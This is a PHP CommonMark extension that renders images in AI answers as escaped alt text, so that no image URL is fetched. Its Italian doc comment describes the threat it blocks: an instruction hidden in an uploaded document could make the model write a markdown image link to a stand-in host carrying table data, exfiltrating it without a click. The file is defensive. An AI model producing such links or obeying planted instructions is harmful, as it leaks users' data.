<?php

namespace App\Markdown;

use League\CommonMark\Environment\EnvironmentBuilderInterface;
use League\CommonMark\Extension\CommonMark\Node\Inline\Image;
use League\CommonMark\Extension\ExtensionInterface;
use League\CommonMark\Node\Node;
use League\CommonMark\Renderer\ChildNodeRendererInterface;
use League\CommonMark\Renderer\NodeRendererInterface;

/**
 * Estensione di CommonMark: un'immagine della risposta diventa il suo testo
 * alternativo. Un <img> il browser lo scarica da solo appena la risposta compare:
 * un'istruzione nascosta in un documento caricato potrebbe far scrivere al modello
 * ![](https://altrove.example/?d=<dati delle tabelle>) e mandare fuori i dati senza
 * un clic. Le risposte vengono da documenti e tabelle: immagini vere non ne hanno.
 */
final class ImageAsTextExtension implements ExtensionInterface, NodeRendererInterface
{
    public function register(EnvironmentBuilderInterface $environment): void
    {
        // Priorità sopra il renderer standard delle immagini (0), che così non viene usato.
        $environment->addRenderer(Image::class, $this, 10);
    }

    /**
     * Il testo alternativo passa dai renderer dei suoi nodi, quindi esce scappato.
     */
    public function render(Node $node, ChildNodeRendererInterface $childRenderer): string
    {
        return $childRenderer->renderNodes($node->children());
    }
}
